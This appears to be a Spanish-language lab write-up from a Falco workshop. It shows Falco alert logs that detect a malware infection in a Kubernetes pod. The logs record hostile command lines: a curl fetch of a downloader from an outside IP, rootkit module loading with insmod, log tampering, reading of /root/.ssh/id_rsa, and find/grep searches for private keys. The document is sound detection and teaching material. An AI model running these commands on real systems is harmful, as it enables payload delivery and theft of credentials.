# CaseA: Infection


> Conexión con un sitio malicioso que expone un (downloader), este redirecciona a un software malicioso alojado en GitHub cuyo objetivo es realizar actividades maliciosas al interior del pod infectado. Tales como: 
Se puede evidenciar como falco detecta la trazabilidad de los compoertamientos del malware en tiempod e ejecución.


El complemento lo tengo en las diapositivas, es decir que se puede extraer de cada log.

Imagen

<img src="/assets/architectureFeeds.jpeg" align="center"/>


### Comportamiento: Descargar archivo malicioso (Downloader)

*Regla: Outbound Connection to C2 Servers*

    {"hostname":"falcox33-falco-obsec-xxtxw","output":"21:23:49.712489624: Warning Outbound connection to C2 server (command=curl -sL http://34.27.180215/sitio/       vuelta.txt pid=7599 connection=10.0.1.71:36438->34.27.180.215:80 user=<NA> user_loginuid=-1 container_id=db0e1dd76a0d image=dockerio/ diegoall1990/ubuntu-lab   Custom_Tags=IRT_Alert) k8s.ns=falco-custom-lab k8s.pod=ubuntu-lab-2 container=db0e1dd76a0d","priority":"Warning", "rule":"Outbound Connection to C2 Servers",     "source":"syscall","tags":["IRT_Alert","network"],"time":"2024-08-01T21:23:49.712489624Z",   "output_fields": {"container.id":"db0e1dd76a0d","container.image.    repository":"docker.io/diegoall1990/ubuntu-lab","evttime":1722547429712489624"fd.    name":"10.0.1.71:36438->34.27.180.215:80","k8s.ns.name":"falco-custom-lab",     "k8s.pod.name":"ubuntu-lab-2","proccmdline":"curl -sLhttp://34.27.180.    215/sitio/vuelta.txt","proc.pid":7599,"user.loginuid":-1,"user.name":"<NA>"}}

    {"hostname":"falcox33-falco-obsec-xxtxw","output":"21:23:51.194577832: Warning Outbound connection to C2 server (command=falco-workshop init--vector Apid=7724            connection=10.0.1.71:36446->34.27.180.215:80 user=<NA> user_loginuid=-1 container_id=db0e1dd76a0d image=docker.iodiegoall1990ubuntu-lab Custom_Tags=IRT_Alert)        k8s.ns=falco-custom-lab k8s.pod=ubuntu-lab-2 container=db0e1dd76a0d","priority":"Warning""rule":"OutboundConnection to C2 Servers","source":"syscall","tags":         ["IRT_Alert","network"],"time":"2024-08-01T21:23:51.194577832Z","output_fields":{"container.id":"db0e1dd76a0d","container.image.repository":"docker.io/          diegoall1990/ubuntu-lab","evttime":1722547431194577832,"fd.name":"10.01.71:36446->34.27.180.215:80","k8s.ns.name":"falco-custom-lab","k8s.pod.        name":"ubuntu-lab-2","proccmdline":"falco-workshop init --vector A""proc.pid":7724,"user.loginuid":-1,"user.name":"<NA>"}}


### Comportamiento: Copiar rootkit en /dev

*Regla: Create files below dev*

    {"hostname":"falcox33-falco-obsec-xxtxw","output":"21:23:51.255002278: Error File created below /dev by untrusted program (user=<NA>user_loginuid=-1       command=falco-workshop init --vector A pid=7724 file=/dev/cust0m_mod.ko container_id=db0e1dd76a0d image=docker.io/diegoall1990ubuntu-lab) k8s.     ns=falco-custom-lab k8s.pod=ubuntu-lab-2 container=db0e1dd76a0d","priority":"Error","rule":"Create files below dev""source":"syscall","tags":["filesystem",      "mitre_persistence"],"time":"2024-08-01T21:23:51.255002278Z", "output_fields": {"containerid":"db0e1dd76a0d","container.image.repository":"docker.io/     diegoall1990/ubuntu-lab","evt.time":1722547431255002278,"fd.name":"/dev/cust0m_mod.ko""k8s.ns.name":"falco-custom-lab","k8s.pod.name":"ubuntu-lab-2","proc.    cmdline":"falco-workshop init --vector A","proc.pid":7724,"user.loginuid":-1"user.name":"<NA>"}}


### Comportamiento: Cargar módulo del kernel con el rootkit

*Regla: Linux kernel module injection using insmod*

    {"hostname":"falcox33-falco-obsec-xxtxw","output":"21:23:51.352662834: Warning Linux Kernel Module injection using insmod detected (user=<NA> user_loginuid=-1 parent_process=falco-workshop module=/dev/cust0m_mod.ko k8s.ns=falco-custom-lab k8s.pod=ubuntu-lab-2 container=db0e1dd76a0d image=docker.io/diegoall1990/ubuntu-lab:1.0.0 Custom_Tags=IRT_Alert)","priority":"Warning","rule":"Linux Kernel Module Injection Detected","source":"syscall","tags":["IRT_Alert","process"],"time":"2024-08-01T21:23:51.352662834Z", "output_fields": {"container.id":"db0e1dd76a0d","container.image.repository":"docker.io/diegoall1990/ubuntu-lab","container.image.tag":"1.0.0","evt.time":1722547431352662834,"k8s.ns.name":"falco-custom-lab","k8s.pod.name":"ubuntu-lab-2","proc.args":"/dev/cust0m_mod.ko","proc.pname":"falco-workshop","user.loginuid":-1,"user.name":"<NA>"}}


### Comportamiento: Eliminar evidencias

*Regla: Clear Log Activities*


    {"hostname":"falcox33-falco-obsec-xxtxw","output":"21:23:54.358589737: Warning Log files were tampered (user=<NA> user_loginuid=-1 command=falco-workshop init --vector A pid=7724 file=/var/log/kern.log container_id=db0e1dd76a0d image=docker.io/diegoall1990/ubuntu-lab) k8s.ns=falco-custom-lab k8s.pod=ubuntu-lab-2 container=db0e1dd76a0d","priority":"Warning","rule":"Clear Log Activities","source":"syscall","tags":["file","mitre_defense_evasion"],"time":"2024-08-01T21:23:54.358589737Z", "output_fields": {"container.id":"db0e1dd76a0d","container.image.repository":"docker.io/diegoall1990/ubuntu-lab","evt.time":1722547434358589737,"fd.name":"/var/log/kern.log","k8s.ns.name":"falco-custom-lab","k8s.pod.name":"ubuntu-lab-2","proc.cmdline":"falco-workshop init --vector A","proc.pid":7724,"user.loginuid":-1,"user.name":"<NA>"}}


### Comportamiento: Lectura de archivos sensibles (keys)

*Regla: Read ssh information*

    {"hostname":"falcox33-falco-obsec-xxtxw","output":"21:23:57.370586910: Error ssh-related file/directory read by non-ssh program (user=<NA> user_loginuid=-1     command=falco-workshop init --vector A pid=7724 file=/root/.ssh/id_rsa parent=falco-workshop pcmdline=falco-workshop init --vector A container_id=db0e1dd76a0d  image=docker.io/diegoall1990/ubuntu-lab Custom_Tags=IRT_Alert) k8s.ns=falco-custom-lab k8s.pod=ubuntu-lab-2 container=db0e1dd76a0d","priority":"Error",  "rule":"Read ssh information","source":"syscall","tags":["IRT_Alert","filesystem","mitre_discovery"],"time":"2024-08-01T21:23:57.370586910Z", "output_fields":    {"container.id":"db0e1dd76a0d","container.image.repository":"docker.io/diegoall1990/ubuntu-lab","evt.time":1722547437370586910,"fd.name":"/root/.ssh/id_rsa",  "k8s.ns.name":"falco-custom-lab","k8s.pod.name":"ubuntu-lab-2","proc.cmdline":"falco-workshop init --vector A","proc.pcmdline":"falco-workshop init --vector A",  "proc.pid":7724,"proc.pname":"falco-workshop","user.loginuid":-1,"user.name":"<NA>"}}


    {"hostname":"falcox33-falco-obsec-xxtxw","output":"21:23:58.387325417: Error ssh-related file/directory read by non-ssh program (user=<NA> user_loginuid=-1 command=cat /root/.ssh/id_rsa pid=7799 file=/root/.ssh/id_rsa parent=falco-workshop pcmdline=falco-workshop init --vector A container_id=db0e1dd76a0d image=docker.io/diegoall1990/ubuntu-lab Custom_Tags=IRT_Alert) k8s.ns=falco-custom-lab k8s.pod=ubuntu-lab-2 container=db0e1dd76a0d","priority":"Error","rule":"Read ssh information","source":"syscall","tags":["IRT_Alert","filesystem","mitre_discovery"],"time":"2024-08-01T21:23:58.387325417Z", "output_fields": {"container.id":"db0e1dd76a0d","container.image.repository":"docker.io/diegoall1990/ubuntu-lab","evt.time":1722547438387325417,"fd.name":"/root/.ssh/id_rsa","k8s.ns.name":"falco-custom-lab","k8s.pod.name":"ubuntu-lab-2","proc.cmdline":"cat /root/.ssh/id_rsa","proc.pcmdline":"falco-workshop init --vector A","proc.pid":7799,"proc.pname":"falco-workshop","user.loginuid":-1,"user.name":"<NA>"}}




### Comportamiento: Ejecutar escaneo de red

*Regla: Launch Suspicious Network Tool in Container*


    {"hostname":"falcox33-falco-obsec-xxtxw","output":"21:23:54.362400604: Notice Network tool launched in container (user=<NA> user_loginuid=-1 command=nmap --version pid=7761 parent_process=falco-workshop container_id=db0e1dd76a0d container_name=ubuntu-lab-2-container image=docker.io/diegoall1990/ubuntu-lab:1.0.0 module=--version Custom_Tags=IRT_Alert) k8s.ns=falco-custom-lab k8s.pod=ubuntu-lab-2 container=db0e1dd76a0d","priority":"Notice","rule":"Launch Suspicious Network Tool in Container","source":"syscall","tags":["IRT_Alert","mitre_discovery","mitre_exfiltration","network","process"],"time":"2024-08-01T21:23:54.362400604Z", "output_fields": {"container.id":"db0e1dd76a0d","container.image.repository":"docker.io/diegoall1990/ubuntu-lab","container.image.tag":"1.0.0","container.name":"ubuntu-lab-2-container","evt.time":1722547434362400604,"k8s.ns.name":"falco-custom-lab","k8s.pod.name":"ubuntu-lab-2","proc.args":"--version","proc.cmdline":"nmap --version","proc.pid":7761,"proc.pname":"falco-workshop","user.loginuid":-1,"user.name":"<NA>"}}



### Comportamiento: Lectura de archivos sensibles (keys)

*Regla: Search Private Keys or Passwords*


El malware realiza busqueda de contraseñas con: find / -name id_rsa y grep -r BEGIN RSA PRIVATE /

    {"hostname":"falcox33-falco-obsec-zxh2m","output":"21:30:11.017975371: Warning Grep private keys or passwords activities found (user=<NA> user_loginuid=-1 command=find / -name id_rsa pid=20456 container_id=c1eeb4f55f2c container_name=my-container image=docker.io/diegoall1990/falco-workshop:0.0.1 Custom_Tags=IRT_Alert) k8s.ns=falco-custom-lab k8s.pod=victim-pod container=c1eeb4f55f2c","priority":"Warning","rule":"Search Private Keys or Passwords","source":"syscall","tags":["IRT_Alert","mitre_credential_access","process"],"time":"2024-08-15T21:30:11.017975371Z", "output_fields": {"container.id":"c1eeb4f55f2c","container.image.repository":"docker.io/diegoall1990/falco-workshop","container.image.tag":"0.0.1","container.name":"my-container","evt.time":1723757411017975371,"k8s.ns.name":"falco-custom-lab","k8s.pod.name":"victim-pod","proc.cmdline":"find / -name id_rsa","proc.pid":20456,"user.loginuid":-1,"user.name":"<NA>"}}

    {"hostname":"falcox33-falco-obsec-zxh2m","output":"21:30:14.539567958: Warning Grep private keys or passwords activities found (user=<NA> user_loginuid=-1 command=grep -r BEGIN RSA PRIVATE / pid=20486 container_id=c1eeb4f55f2c container_name=my-container image=docker.io/diegoall1990/falco-workshop:0.0.1 Custom_Tags=IRT_Alert) k8s.ns=falco-custom-lab k8s.pod=victim-pod container=c1eeb4f55f2c","priority":"Warning","rule":"Search Private Keys or Passwords","source":"syscall","tags":["IRT_Alert","mitre_credential_access","process"],"time":"2024-08-15T21:30:14.539567958Z", "output_fields": {"container.id":"c1eeb4f55f2c","container.image.repository":"docker.io/diegoall1990/falco-workshop","container.image.tag":"0.0.1","container.name":"my-container","evt.time":1723757414539567958,"k8s.ns.name":"falco-custom-lab","k8s.pod.name":"victim-pod","proc.cmdline":"grep -r BEGIN RSA PRIVATE /","proc.pid":20486,"user.loginuid":-1,"user.name":"<NA>"}}